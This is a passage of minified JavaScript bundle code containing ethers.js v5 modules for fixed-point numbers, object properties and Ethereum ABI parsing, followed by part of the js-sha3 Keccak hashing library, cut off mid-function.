fromString(e,t){t==null&&(t="fixed");const i=tw.from(t),n=Xu(e,i.decimals);!i.signed&&n.lt(sZ)&&aZ("unsigned value cannot be negative","overflow","value",e);let s=null;i.signed?s=n.toTwos(i.width).toHexString():(s=n.toHexString(),s=Xi(s,i.width/8));const o=q8(n,i.decimals);return new io(m5,s,o,i)}static fromBytes(e,t){t==null&&(t="fixed");const i=tw.from(t);if(ze(e).length>i.width/8)throw new Error("overflow");let n=Ge.from(e);i.signed&&(n=n.fromTwos(i.width));const s=n.toTwos((i.signed?0:1)+i.width).toHexString(),o=q8(n,i.decimals);return new io(m5,s,o,i)}static from(e,t){if(typeof e=="string")return io.fromString(e,t);if(Hg(e))return io.fromBytes(e,t);try{return io.fromValue(e,0,t)}catch(i){if(i.code!==be.errors.INVALID_ARGUMENT)throw i}return Ho.throwArgumentError("invalid FixedNumber value","value",e)}static isFixedNumber(e){return!!(e&&e._isFixedNumber)}}const ZB=io.from(1),jae=io.from("0.5"),Fae="properties/5.8.0";var qae=function(r,e,t,i){function n(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(u){try{l(i.next(u))}catch(d){o(d)}}function c(u){try{l(i.throw(u))}catch(d){o(d)}}function l(u){u.done?s(u.value):n(u.value).then(a,c)}l((i=i.apply(r,e||[])).next())})};const R9=new be(Fae);function Pe(r,e,t){Object.defineProperty(r,e,{enumerable:!0,value:t,writable:!1})}function Ta(r,e){for(let t=0;t<32;t++){if(r[e])return r[e];if(!r.prototype||typeof r.prototype!="object")break;r=Object.getPrototypeOf(r.prototype).constructor}return null}function Un(r){return qae(this,void 0,void 0,function*(){const e=Object.keys(r).map(i=>{const n=r[i];return Promise.resolve(n).then(s=>({key:i,value:s}))});return(yield Promise.all(e)).reduce((i,n)=>(i[n.key]=n.value,i),{})})}function o$(r,e){(!r||typeof r!="object")&&R9.throwArgumentError("invalid object","object",r),Object.keys(r).forEach(t=>{e[t]||R9.throwArgumentError("invalid object key - "+t,"transaction:"+t,r)})}function ds(r){const e={};for(const t in r)e[t]=r[t];return e}const zae={bigint:!0,boolean:!0,function:!0,number:!0,string:!0};function cZ(r){if(r==null||zae[typeof r])return!0;if(Array.isArray(r)||typeof r=="object"){if(!Object.isFrozen(r))return!1;const e=Object.keys(r);for(let t=0;t<e.length;t++){let i=null;try{i=r[e[t]]}catch{continue}if(!cZ(i))return!1}return!0}return R9.throwArgumentError(`Cannot deepCopy ${typeof r}`,"object",r)}function Wae(r){if(cZ(r))return r;if(Array.isArray(r))return Object.freeze(r.map(e=>Id(e)));if(typeof r=="object"){const e={};for(const t in r){const i=r[t];i!==void 0&&Pe(e,t,Id(i))}return e}return R9.throwArgumentError(`Cannot deepCopy ${typeof r}`,"object",r)}function Id(r){return Wae(r)}class xp{constructor(e){for(const t in e)this[t]=Id(e[t])}}const Hae=Object.freeze(Object.defineProperty({__proto__:null,Description:xp,checkProperties:o$,deepCopy:Id,defineReadOnly:Pe,getStatic:Ta,resolveProperties:Un,shallowCopy:ds},Symbol.toStringTag,{value:"Module"})),Gy="abi/5.8.0",Qr=new be(Gy),W1={};let YB={calldata:!0,memory:!0,storage:!0},Vae={calldata:!0,memory:!0};function C6(r,e){if(r==="bytes"||r==="string"){if(YB[e])return!0}else if(r==="address"){if(e==="payable")return!0}else if((r.indexOf("[")>=0||r==="tuple")&&Vae[e])return!0;return(YB[e]||e==="payable")&&Qr.throwArgumentError("invalid modifier","name",e),!1}function Kae(r,e){let t=r;function i(a){Qr.throwArgumentError(`unexpected character at position ${a}`,"param",r)}r=r.replace(/\s/g," ");function n(a){let c={type:"",name:"",parent:a,state:{allowType:!0}};return e&&(c.indexed=!1),c}let s={type:"",name:"",state:{allowType:!0}},o=s;for(let a=0;a<r.length;a++){let c=r[a];switch(c){case"(":o.state.allowType&&o.type===""?o.type="tuple":o.state.allowParams||i(a),o.state.allowType=!1,o.type=Am(o.type),o.components=[n(o)],o=o.components[0];break;case")":delete o.state,o.name==="indexed"&&(e||i(a),o.indexed=!0,o.name=""),C6(o.type,o.name)&&(o.name=""),o.type=Am(o.type);let l=o;o=o.parent,o||i(a),delete l.parent,o.state.allowParams=!1,o.state.allowName=!0,o.state.allowArray=!0;break;case",":delete o.state,o.name==="indexed"&&(e||i(a),o.indexed=!0,o.name=""),C6(o.type,o.name)&&(o.name=""),o.type=Am(o.type);let u=n(o.parent);o.parent.components.push(u),delete o.parent,o=u;break;case" ":o.state.allowType&&o.type!==""&&(o.type=Am(o.type),delete o.state.allowType,o.state.allowName=!0,o.state.allowParams=!0),o.state.allowName&&o.name!==""&&(o.name==="indexed"?(e||i(a),o.indexed&&i(a),o.indexed=!0,o.name=""):C6(o.type,o.name)?o.name="":o.state.allowName=!1);break;case"[":o.state.allowArray||i(a),o.type+=c,o.state.allowArray=!1,o.state.allowName=!1,o.state.readArray=!0;break;case"]":o.state.readArray||i(a),o.type+=c,o.state.readArray=!1,o.state.allowArray=!0,o.state.allowName=!0;break;default:o.state.allowType?(o.type+=c,o.state.allowParams=!0,o.state.allowArray=!0):o.state.allowName?(o.name+=c,delete o.state.allowArray):o.state.readArray?o.type+=c:i(a)}}return o.parent&&Qr.throwArgumentError("unexpected eof","param",r),delete s.state,o.name==="indexed"?(e||i(t.length-7),o.indexed&&i(t.length-7),o.indexed=!0,o.name=""):C6(o.type,o.name)&&(o.name=""),s.type=Am(s.type),s}function z8(r,e){for(let t in e)Pe(r,t,e[t])}const oi=Object.freeze({sighash:"sighash",minimal:"minimal",full:"full",json:"json"}),Gae=new RegExp(/^(.*)\[([0-9]*)\]$/);class xs{constructor(e,t){e!==W1&&Qr.throwError("use fromString",be.errors.UNSUPPORTED_OPERATION,{operation:"new ParamType()"}),z8(this,t);let i=this.type.match(Gae);i?z8(this,{arrayLength:parseInt(i[2]||"-1"),arrayChildren:xs.fromObject({type:i[1],components:this.components}),baseType:"array"}):z8(this,{arrayLength:null,arrayChildren:null,baseType:this.components!=null?"tuple":this.type}),this._isParamType=!0,Object.freeze(this)}format(e){if(e||(e=oi.sighash),oi[e]||Qr.throwArgumentError("invalid format type","format",e),e===oi.json){let i={type:this.baseType==="tuple"?"tuple":this.type,name:this.name||void 0};return typeof this.indexed=="boolean"&&(i.indexed=this.indexed),this.components&&(i.components=this.components.map(n=>JSON.parse(n.format(e)))),JSON.stringify(i)}let t="";return this.baseType==="array"?(t+=this.arrayChildren.format(e),t+="["+(this.arrayLength<0?"":String(this.arrayLength))+"]"):this.baseType==="tuple"?(e!==oi.sighash&&(t+=this.type),t+="("+this.components.map(i=>i.format(e)).join(e===oi.full?", ":",")+")"):t+=this.type,e!==oi.sighash&&(this.indexed===!0&&(t+=" indexed"),e===oi.full&&this.name&&(t+=" "+this.name)),t}static from(e,t){return typeof e=="string"?xs.fromString(e,t):xs.fromObject(e)}static fromObject(e){return xs.isParamType(e)?e:new xs(W1,{name:e.name||null,type:Am(e.type),indexed:e.indexed==null?null:!!e.indexed,components:e.components?e.components.map(xs.fromObject):null})}static fromString(e,t){function i(n){return xs.fromObject({name:n.name,type:n.type,indexed:n.indexed,components:n.components})}return i(Kae(e,!!t))}static isParamType(e){return!!(e!=null&&e._isParamType)}}function rv(r,e){return Yae(r).map(t=>xs.fromString(t,e))}class fd{constructor(e,t){e!==W1&&Qr.throwError("use a static from method",be.errors.UNSUPPORTED_OPERATION,{operation:"new Fragment()"}),z8(this,t),this._isFragment=!0,Object.freeze(this)}static from(e){return fd.isFragment(e)?e:typeof e=="string"?fd.fromString(e):fd.fromObject(e)}static fromObject(e){if(fd.isFragment(e))return e;switch(e.type){case"function":return su.fromObject(e);case"event":return ud.fromObject(e);case"constructor":return nu.fromObject(e);case"error":return Hh.fromObject(e);case"fallback":case"receive":return null}return Qr.throwArgumentError("invalid fragment object","value",e)}static fromString(e){return e=e.replace(/\s/g," "),e=e.replace(/\(/g," (").replace(/\)/g,") ").replace(/\s+/g," "),e=e.trim(),e.split(" ")[0]==="event"?ud.fromString(e.substring(5).trim()):e.split(" ")[0]==="function"?su.fromString(e.substring(8).trim()):e.split("(")[0].trim()==="constructor"?nu.fromString(e.trim()):e.split(" ")[0]==="error"?Hh.fromString(e.substring(5).trim()):Qr.throwArgumentError("unsupported fragment","value",e)}static isFragment(e){return!!(e&&e._isFragment)}}class ud extends fd{format(e){if(e||(e=oi.sighash),oi[e]||Qr.throwArgumentError("invalid format type","format",e),e===oi.json)return JSON.stringify({type:"event",anonymous:this.anonymous,name:this.name,inputs:this.inputs.map(i=>JSON.parse(i.format(e)))});let t="";return e!==oi.sighash&&(t+="event "),t+=this.name+"("+this.inputs.map(i=>i.format(e)).join(e===oi.full?", ":",")+") ",e!==oi.sighash&&this.anonymous&&(t+="anonymous "),t.trim()}static from(e){return typeof e=="string"?ud.fromString(e):ud.fromObject(e)}static fromObject(e){if(ud.isEventFragment(e))return e;e.type!=="event"&&Qr.throwArgumentError("invalid event object","value",e);const t={name:iv(e.name),anonymous:e.anonymous,inputs:e.inputs?e.inputs.map(xs.fromObject):[],type:"event"};return new ud(W1,t)}static fromString(e){let t=e.match(nv);t||Qr.throwArgumentError("invalid event string","value",e);let i=!1;return t[3].split(" ").forEach(n=>{switch(n.trim()){case"anonymous":i=!0;break;case"":break;default:Qr.warn("unknown modifier: "+n)}}),ud.fromObject({name:t[1].trim(),anonymous:i,inputs:rv(t[2],!0),type:"event"})}static isEventFragment(e){return e&&e._isFragment&&e.type==="event"}}function lZ(r,e){e.gas=null;let t=r.split("@");return t.length!==1?(t.length>2&&Qr.throwArgumentError("invalid human-readable ABI signature","value",r),t[1].match(/^[0-9]+$/)||Qr.throwArgumentError("invalid human-readable ABI signature gas","value",r),e.gas=Ge.from(t[1]),t[0]):r}function uZ(r,e){e.constant=!1,e.payable=!1,e.stateMutability="nonpayable",r.split(" ").forEach(t=>{switch(t.trim()){case"constant":e.constant=!0;break;case"payable":e.payable=!0,e.stateMutability="payable";break;case"nonpayable":e.payable=!1,e.stateMutability="nonpayable";break;case"pure":e.constant=!0,e.stateMutability="pure";break;case"view":e.constant=!0,e.stateMutability="view";break;case"external":case"public":case"":break;default:console.log("unknown modifier: "+t)}})}function dZ(r){let e={constant:!1,payable:!0,stateMutability:"payable"};return r.stateMutability!=null?(e.stateMutability=r.stateMutability,e.constant=e.stateMutability==="view"||e.stateMutability==="pure",r.constant!=null&&!!r.constant!==e.constant&&Qr.throwArgumentError("cannot have constant function with mutability "+e.stateMutability,"value",r),e.payable=e.stateMutability==="payable",r.payable!=null&&!!r.payable!==e.payable&&Qr.throwArgumentError("cannot have payable function with mutability "+e.stateMutability,"value",r)):r.payable!=null?(e.payable=!!r.payable,r.constant==null&&!e.payable&&r.type!=="constructor"&&Qr.throwArgumentError("unable to determine stateMutability","value",r),e.constant=!!r.constant,e.constant?e.stateMutability="view":e.stateMutability=e.payable?"payable":"nonpayable",e.payable&&e.constant&&Qr.throwArgumentError("cannot have constant payable function","value",r)):r.constant!=null?(e.constant=!!r.constant,e.payable=!e.constant,e.stateMutability=e.constant?"view":"payable"):r.type!=="constructor"&&Qr.throwArgumentError("unable to determine stateMutability","value",r),e}class nu extends fd{format(e){if(e||(e=oi.sighash),oi[e]||Qr.throwArgumentError("invalid format type","format",e),e===oi.json)return JSON.stringify({type:"constructor",stateMutability:this.stateMutability!=="nonpayable"?this.stateMutability:void 0,payable:this.payable,gas:this.gas?this.gas.toNumber():void 0,inputs:this.inputs.map(i=>JSON.parse(i.format(e)))});e===oi.sighash&&Qr.throwError("cannot format a constructor for sighash",be.errors.UNSUPPORTED_OPERATION,{operation:"format(sighash)"});let t="constructor("+this.inputs.map(i=>i.format(e)).join(e===oi.full?", ":",")+") ";return this.stateMutability&&this.stateMutability!=="nonpayable"&&(t+=this.stateMutability+" "),t.trim()}static from(e){return typeof e=="string"?nu.fromString(e):nu.fromObject(e)}static fromObject(e){if(nu.isConstructorFragment(e))return e;e.type!=="constructor"&&Qr.throwArgumentError("invalid constructor object","value",e);let t=dZ(e);t.constant&&Qr.throwArgumentError("constructor cannot be constant","value",e);const i={name:null,type:e.type,inputs:e.inputs?e.inputs.map(xs.fromObject):[],payable:t.payable,stateMutability:t.stateMutability,gas:e.gas?Ge.from(e.gas):null};return new nu(W1,i)}static fromString(e){let t={type:"constructor"};e=lZ(e,t);let i=e.match(nv);return(!i||i[1].trim()!=="constructor")&&Qr.throwArgumentError("invalid constructor string","value",e),t.inputs=rv(i[2].trim(),!1),uZ(i[3].trim(),t),nu.fromObject(t)}static isConstructorFragment(e){return e&&e._isFragment&&e.type==="constructor"}}class su extends nu{format(e){if(e||(e=oi.sighash),oi[e]||Qr.throwArgumentError("invalid format type","format",e),e===oi.json)return JSON.stringify({type:"function",name:this.name,constant:this.constant,stateMutability:this.stateMutability!=="nonpayable"?this.stateMutability:void 0,payable:this.payable,gas:this.gas?this.gas.toNumber():void 0,inputs:this.inputs.map(i=>JSON.parse(i.format(e))),outputs:this.outputs.map(i=>JSON.parse(i.format(e)))});let t="";return e!==oi.sighash&&(t+="function "),t+=this.name+"("+this.inputs.map(i=>i.format(e)).join(e===oi.full?", ":",")+") ",e!==oi.sighash&&(this.stateMutability?this.stateMutability!=="nonpayable"&&(t+=this.stateMutability+" "):this.constant&&(t+="view "),this.outputs&&this.outputs.length&&(t+="returns ("+this.outputs.map(i=>i.format(e)).join(", ")+") "),this.gas!=null&&(t+="@"+this.gas.toString()+" ")),t.trim()}static from(e){return typeof e=="string"?su.fromString(e):su.fromObject(e)}static fromObject(e){if(su.isFunctionFragment(e))return e;e.type!=="function"&&Qr.throwArgumentError("invalid function object","value",e);let t=dZ(e);const i={type:e.type,name:iv(e.name),constant:t.constant,inputs:e.inputs?e.inputs.map(xs.fromObject):[],outputs:e.outputs?e.outputs.map(xs.fromObject):[],payable:t.payable,stateMutability:t.stateMutability,gas:e.gas?Ge.from(e.gas):null};return new su(W1,i)}static fromString(e){let t={type:"function"};e=lZ(e,t);let i=e.split(" returns ");i.length>2&&Qr.throwArgumentError("invalid function string","value",e);let n=i[0].match(nv);if(n||Qr.throwArgumentError("invalid function signature","value",e),t.name=n[1].trim(),t.name&&iv(t.name),t.inputs=rv(n[2],!1),uZ(n[3].trim(),t),i.length>1){let s=i[1].match(nv);(s[1].trim()!=""||s[3].trim()!="")&&Qr.throwArgumentError("unexpected tokens","value",e),t.outputs=rv(s[2],!1)}else t.outputs=[];return su.fromObject(t)}static isFunctionFragment(e){return e&&e._isFragment&&e.type==="function"}}function JB(r){const e=r.format();return(e==="Error(string)"||e==="Panic(uint256)")&&Qr.throwArgumentError(`cannot specify user defined ${e} error`,"fragment",r),r}class Hh extends fd{format(e){if(e||(e=oi.sighash),oi[e]||Qr.throwArgumentError("invalid format type","format",e),e===oi.json)return JSON.stringify({type:"error",name:this.name,inputs:this.inputs.map(i=>JSON.parse(i.format(e)))});let t="";return e!==oi.sighash&&(t+="error "),t+=this.name+"("+this.inputs.map(i=>i.format(e)).join(e===oi.full?", ":",")+") ",t.trim()}static from(e){return typeof e=="string"?Hh.fromString(e):Hh.fromObject(e)}static fromObject(e){if(Hh.isErrorFragment(e))return e;e.type!=="error"&&Qr.throwArgumentError("invalid error object","value",e);const t={type:e.type,name:iv(e.name),inputs:e.inputs?e.inputs.map(xs.fromObject):[]};return JB(new Hh(W1,t))}static fromString(e){let t={type:"error"},i=e.match(nv);return i||Qr.throwArgumentError("invalid error signature","value",e),t.name=i[1].trim(),t.name&&iv(t.name),t.inputs=rv(i[2],!1),JB(Hh.fromObject(t))}static isErrorFragment(e){return e&&e._isFragment&&e.type==="error"}}function Am(r){return r.match(/^uint($|[^1-9])/)?r="uint256"+r.substring(4):r.match(/^int($|[^1-9])/)&&(r="int256"+r.substring(3)),r}const Zae=new RegExp("^[a-zA-Z$_][a-zA-Z0-9$_]*$");function iv(r){return(!r||!r.match(Zae))&&Qr.throwArgumentError(`invalid identifier "${r}"`,"value",r),r}const nv=new RegExp("^([^)(]*)\\((.*)\\)([^)(]*)$");function Yae(r){r=r.trim();let e=[],t="",i=0;for(let n=0;n<r.length;n++){let s=r[n];s===","&&i===0?(e.push(t),t=""):(t+=s,s==="("?i++:s===")"&&(i--,i===-1&&Qr.throwArgumentError("unbalanced parenthesis","value",r)))}return t&&e.push(t),e}const a$=new be(Gy);function hZ(r){const e=[],t=function(i,n){if(Array.isArray(n))for(let s in n){const o=i.slice();o.push(s);try{t(o,n[s])}catch(a){e.push({path:o,error:a})}}};return t([],r),e}class S0{constructor(e,t,i,n){this.name=e,this.type=t,this.localName=i,this.dynamic=n}_throwError(e,t){a$.throwArgumentError(e,this.localName,t)}}class zT{constructor(e){Pe(this,"wordSize",e||32),this._data=[],this._dataLength=0,this._padding=new Uint8Array(e)}get data(){return Wo(this._data)}get length(){return this._dataLength}_writeData(e){return this._data.push(e),this._dataLength+=e.length,e.length}appendWriter(e){return this._writeData(cn(e._data))}writeBytes(e){let t=ze(e);const i=t.length%this.wordSize;return i&&(t=cn([t,this._padding.slice(i)])),this._writeData(t)}_getValue(e){let t=ze(Ge.from(e));return t.length>this.wordSize&&a$.throwError("value out-of-bounds",be.errors.BUFFER_OVERRUN,{length:this.wordSize,offset:t.length}),t.length%this.wordSize&&(t=cn([this._padding.slice(t.length%this.wordSize),t])),t}writeValue(e){return this._writeData(this._getValue(e))}writeUpdatableValue(){const e=this._data.length;return this._data.push(this._padding),this._dataLength+=this.wordSize,t=>{this._data[e]=this._getValue(t)}}}class O9{constructor(e,t,i,n){Pe(this,"_data",ze(e)),Pe(this,"wordSize",t||32),Pe(this,"_coerceFunc",i),Pe(this,"allowLoose",n),this._offset=0}get data(){return Qe(this._data)}get consumed(){return this._offset}static coerce(e,t){let i=e.match("^u?int([0-9]+)$");return i&&parseInt(i[1])<=48&&(t=t.toNumber()),t}coerce(e,t){return this._coerceFunc?this._coerceFunc(e,t):O9.coerce(e,t)}_peekBytes(e,t,i){let n=Math.ceil(t/this.wordSize)*this.wordSize;return this._offset+n>this._data.length&&(this.allowLoose&&i&&this._offset+t<=this._data.length?n=t:a$.throwError("data out-of-bounds",be.errors.BUFFER_OVERRUN,{length:this._data.length,offset:this._offset+n})),this._data.slice(this._offset,this._offset+n)}subReader(e){return new O9(this._data.slice(this._offset+e),this.wordSize,this._coerceFunc,this.allowLoose)}readBytes(e,t){let i=this._peekBytes(0,e,!!t);return this._offset+=i.length,i.slice(0,e)}readValue(){return Ge.from(this.readBytes(this.wordSize))}}var DE={exports:{}};/**
 * [js-sha3]{@link https://github.com/emn178/js-sha3}
 *
 * @version 0.8.0
 * @author Chen, Yi-Cyuan [emn178@gmail.com]
 * @copyright Chen, Yi-Cyuan 2015-2018
 * @license MIT
 */var QB;function Jae(){return QB||(QB=1,function(r){(function(){var e="input is invalid type",t="finalize already called",i=typeof window=="object",n=i?window:{};n.JS_SHA3_NO_WINDOW&&(i=!1);var s=!i&&typeof self=="object",o=!n.JS_SHA3_NO_NODE_JS&&typeof process=="object"&&process.versions&&process.versions.node;o?n=Po:s&&(n=self);var a=!n.JS_SHA3_NO_COMMON_JS&&!0&&r.exports,c=!n.JS_SHA3_NO_ARRAY_BUFFER&&typeof ArrayBuffer<"u",l="0123456789abcdef".split(""),u=[31,7936,2031616,520093696],d=[4,1024,262144,67108864],h=[1,256,65536,16777216],f=[6,1536,393216,100663296],p=[0,8,16,24],g=[1,0,32898,0,32906,2147483648,2147516416,2147483648,32907,0,2147483649,0,2147516545,2147483648,32777,2147483648,138,0,136,0,2147516425,0,2147483658,0,2147516555,0,139,2147483648,32905,2147483648,32771,2147483648,32770,2147483648,128,2147483648,32778,0,2147483658,2147483648,2147516545,2147483648,32896,2147483648,2147483649,0,2147516424,2147483648],w=[224,256,384,512],m=[128,256],x=["hex","buffer","arrayBuffer","array","digest"],S={128:168,256:136};(n.JS_SHA3_NO_NODE_JS||!Array.isArray)&&(Array.isArray=function(q){return Object.prototype.toString.call(q)==="[object Array]"}),c&&(n.JS_SHA3_NO_ARRAY_BUFFER_IS_VIEW||!ArrayBuffer.isView)&&(ArrayBuffer.isView=function(q){return typeof q=="object"&&q.buffer&&q.buffer.constructor===ArrayBuffer});for(var T=function(q,J,le){return function(ae){return new M(q,J,q).update(ae)[le]()}},k=function(q,J,le){return function(ae,U){return new M(q,J,U).update(ae)[le]()}},I=function(q,J,le){return function(ae,U,G,Z){return b["cshake"+q].update(ae,U,G,Z)[le]()}},E=function(q,J,le){return function(ae,U,G,Z){return b["kmac"+q].update(ae,U,G,Z)[le]()}},C=function(q,J,le,ae){for(var U=0;U<x.length;++U){var G=x[U];q[G]=J(le,ae,G)}return q},N=function(q,J){var le=T(q,J,"hex");return le.create=function(){return new M(q,J,q)},le.update=function(ae){return le.create().update(ae)},C(le,T,q,J)},L=function(q,J){var le=k(q,J,"hex");return le.create=function(ae){return new M(q,J,ae)},le.update=function(ae,U){return le.create(U).update(ae)},C(le,k,q,J)},$=function(q,J){var le=S[q],ae=I(q,J,"hex");return ae.create=function(U,G,Z){return!G&&!Z?b["shake"+q].create(U):new M(q,J,U).bytepad([G,Z],le)},ae.update=function(U,G,Z,j){return ae.create(G,Z,j).update(U)},C(ae,I,q,J)},y=function(q,J){var le=S[q],ae=E(q,J,"hex");return ae.create=function(U,G,Z){return new W(q,J,G).bytepad(["KMAC",Z],le).bytepad([U],le)},ae.update=function(U,G,Z,j){return ae.create(U,Z,j).update(G)},C(ae,E,q,J)},A=[{name:"keccak",padding:h,bits:w,createMethod:N},{name:"sha3",padding:f,bits:w,createMethod:N},{name:"shake",padding:u,bits:m,createMethod:L},{name:"cshake",padding:d,bits:m,createMethod:$},{name:"kmac",padding:d,bits:m,createMethod:y}],b={},v=[],_=0;_<A.length;++_)for(var O=A[_],D=O.bits,R=0;R<D.length;++R){var P=O.name+"_"+D[R];if(v.push(P),b[P]=O.createMethod(D[R],O.padding),O.name!=="sha3"){var B=O.name+D[R];v.push(B),b[B]=b[P]}}function M(q,J,le){this.blocks=[],this.s=[],this.padding=J,this.outputBits=le,this.reset=!0,this.finalized=!1,this.block=0,this.start=0,this.blockCount=1600-(q<<1)>>5,this.byteCount=this.blockCount<<2,this.outputBlocks=le>>5,this.extraBytes=(le&31)>>3;for(var ae=0;ae<50;++ae)this.s[ae]=0}M.prototype.update=function(q){if(this.finalized)throw new Error(t);var J,le=typeof q;if(le!=="string"){if(le==="object"){if(q===null)throw new Error(e);if(c&&q.constructor===ArrayBuffer)q=new Uint8Array(q);else if(!Array.isArray(q)&&(!c||!ArrayBuffer.isView(q)))throw new Error(e)}else throw new Error(e);J=!0}for(var ae=this.blocks,U=this.byteCount,G=q.length,Z=this.blockCount,j=0,Y=this.s,se,ne;j<G;){if(this.reset)for(this.reset=!1,ae[0]=this.block,se=1;se<Z+1;++se)ae[se]=0;if(J)for(se=this.start;j<G&&se<U;++j)ae[se>>2]|=q[j]<<p[se++&3];else for(se=this.start;j<G&&se<U;++j)ne=q.charCodeAt(j),ne<128?ae[se>>2]|=ne<<p[se++&3]:ne<2048?(ae[se>>2]|=(192|ne>>6)<<p[se++&3],ae[se>>2]|=(128|ne&63)<<p[se++&3]):ne<55296||ne>=57344?(ae[se>>2]|=(224|ne>>12)<<p[se++&3],ae[se>>2]|=(128|ne>>6&63)<<p[se++&3],ae[se>>2]|=(128|ne&63)<<p[se++&3]):(ne=65536+((ne&1023)<<10|q.charCodeAt(++j)&1023),ae[se>>2]|=(240|ne>>18)<<p[se++&3],ae[se>>2]|=(128|ne>>12&63)<<p[se++&3],ae[se>>2]|=(128|ne>>6&63)<<p[se++&3],ae[se>>2]|=(128|ne&63)<<p[se++&3]);if(this.lastByteIndex=se,se>=U){for(this.start=se-U,this.block=ae[Z],se=0;se<Z;++se)Y[se]^=ae[se];K(Y),this.reset=!0}else this.start=se}return this},M.prototype.encode=function(q,J){var le=q&255,ae=1,U=[le];for(q=q>>8,le=q&255;le>0;)U.unshift(le),q=q>>8,le=q&255,++ae;return J?U.push(ae):U.unshift(ae),this.update(U),U.length},M.prototype.encodeString=function(q){var J,le=typeof q;if(le!=="string"){if(le==="object"){if(q===null)throw new Error(e);if(c&&q.constructor===ArrayBuffer)q=new Uint8Array(q);else if(!Array.isArray(q)&&(!c||!ArrayBuffer.isView(q)))throw new Error(e)}else throw new Error(e);J=!0}var ae=0,U=q.length;if(J)ae=U;else for(var G=0;G<q.length;++G){var Z=q.charCodeAt(G);Z<128?ae+=1:Z<2048?ae+=2:Z<55296||Z>=57344?ae+=3:(Z=65536+((Z&1023)<<10|q.charCodeAt(++G)&1023),ae+=4)}return ae+=this.encode(ae*8),this.update(q),ae},M.prototype.bytepad=function(q,J){for(var le=this.encode(J),ae=0;ae<q.length;++ae)le+=this.encodeString(q[ae]);var U=J-le%J,G=[];return G.length=U,this.update(G),this},M.prototype.finalize=function(){if(!this.finalized){this.finalized=!0;var q=this.blocks,J=this.lastByteIndex,le=this.blockCount,ae=this.s;if(q[J>>2]|=this.padding[J&3],this.lastByteIndex===this.byteCount)for(q[0]=q[le],J=1;J<le+1;++J)q[J]=0;for(q[le-1]|=2147483648,J=0;J<le;++J)ae[J]^=q[J];K(ae)}},M.prototype.toString=M.prototype.hex=function(){this.finalize();for(var q=this.blockCount,J=this.s,le=this.outputBlocks,ae=this.extraBytes,U=0,G=0,Z="",j;G<le;){for(U=0;U<q&&G<le;++U,++G)j=J[U],Z+=l[j>>4&15]+l[j&15]+l[j>>12&15]+l[j>>8&15]+l[j>>20&15]+l[j>>16&15]+l[j>>28&15]+l[j>>24&15];G%q===0&&(K(J),U=0)}return ae&&(j=J[U],Z+=l[j>>4&15]+l[j&15],ae>1&&(Z+=l[j>>12&15]+l[j>>8&15]),ae>2&&(Z+=l[j>>20&15]+l[j>>16&15])),Z},M.prototype.arrayBuffer=function(){this.finalize();var q=this.blockCount,J=this.s,le=this.outputBlocks,ae=this.extraBytes,U=0,G=0,Z=this.outputBits>>3,j;ae?j=new ArrayBuffer(le+1<<2):j=new ArrayBuffer(Z);for(var Y=new Uint32Array(j);G<le;){for(U=0;U<q&&G<le;++U,++G)Y[G]=J[U];G%q===0&&K(J)}return ae&&(Y[U]=J[U],j=j.slice(0,Z)),j},M.prototype.buffer=M.prototype.arrayBuffer,M.prototype.digest=M.prototype.array=function(){this.finalize();for(var q=this.blockCount,J=this.s,le=this.outputBlocks,ae=this.extraBytes,U=0,G=0,Z=[],j,Y;G<le;){for(U=0;U<q&&G<le;++U,++G)j=G<<2,Y=J[U],Z[j]=Y&255,Z[j+1]=Y>>8&255,Z[j+2]=Y>>16&255,Z[j+3]=Y>>24&255;G%q===0&&K(J)}return ae&&(j=G<<2,Y=J[U],Z[j]=Y&255,ae>1&&(Z[j+1]=Y>>8&255),ae>2&&(Z[j+2]=Y>>16&255)),Z};function W(q,J,le){M.call(this,q,J,le)}W.prototype=new M,W.prototype.finalize=function(){return this.encode(this.outputBits,!0),M.prototype.finalize.call(this)};var K=function(q){var J,le,ae,U,G,Z,j,Y,se,ne,Te,Re,$e,Ae,De,Le,it,nt,ct,St,zt,Q,z,H,ie,pe,we,_e,et,yt,Ye,$t,xt,Mt,Pr,Ur,Vt,jr,Br,Ct,er,tr,mt,or,ar,It,cr,lr,At,rr,Kt,wt,ir,ur,Tt,ui,Ar,ri,qn,yo,xo,Co,Rn;for(ae=0;ae<48;ae+=2)U=q[0]^q[10]^q[20]^q[30]^q[40],G=q[1]^q[11]^q[21]^q[31]^q[41],Z=q[2]^q[12]^q[22]^q[32]^q[42],j=q[3]^q[13]^q[23]^q[33]^q[43],Y=q[4]^q[14]^q[24]^q[34]^q[44],se=q[5]^q[15]^q[25]^q[35]^q[45],ne=q[6]^q[16]^q[26]^q[36]^q[46],Te=q[7]^q[17]^q[27]^q[37]^q[47],Re=q[8]^q[18]^q[28]^q[38]^q[48],$e=q[9]^q[19]^q[29]^q[39]^q[49],J=Re^(Z<<1|j>>>31),le=$e^(j<<1|Z>>>31),q[0]^=J,q[1]^=le,q[10]^=J,q[11]^=le,q[20]^=J,q[21]^=le,q[30]^=J,q[31]^=le,q[40]^=J,q[41]^=le,J=U^(Y<<1|se>>>31),le=G^(se<<1|Y>>>31),q[2]^=J,q[3]^=le,q[12]^=J,q[13]^=le,q[22]^=J,q[23]^=le,q[32]^=J,q[33]^=le,q[42]^=J,q[43]^=le,J=Z^(ne<<1|Te>>>31),le=j^(Te<<1|ne>>>31),q[4]^=J,q[5]^=le,q[14]^=J,q[15]^=le,q[24]^=J,q[25]^=le,q[34]^=J,q[35]^=le,q[44]^=J,q[45]^=le,J=Y^(Re<<1|$e>>>31),le=se^($e<<1|Re>>>31),q[6]^=J,q[7]^=le,q[16]^=J,q[17]^=le,q[26]^=J,q[27]^=le,q[36]^=J,q[37]^=le,q[46]^=J,q[47]^=le,J=ne^(U<<1|G>>>31),le=Te^(G<<1|U>>>31),q[8]^=J,q[9]^=le,q[18]^=J,q[19]^=le,q[28]^=J,q[29]^=le,q[38]^=J,q[39]^=le,q[48]^=J,q[49]^=le,Ae=q[0],De=q[1],It=q[11]<<4|q[10]>>>28,cr=q[10]<<4|q[11]>>>28,_e=q[20]<<3|q[21]>>>29,et=q[21]<<3|q[20]>>>29,yo=q[31]<<9|q[30]>>>23,xo=q[30]<<9|q[31]>>>23,tr=q[40]<<18|q[41]>>>14,mt=q[41]<<18|q[40]>>>14,Mt=q[2]<<1|q[3]>>>31,Pr=q[3]<<1|q[2]>>>31,Le=q[13]<<12|q[12]>>>20,it=q[12]<<12|q[13]>>>20,lr=q[22]<<10|q[23]>>>22,At=q[23]<<10|q[22]>>>22,yt=q[33]<<13|q[32]>>>19,Ye=q[32]<<13|q[33]>>>19,Co=q[42]<<2|q[43]>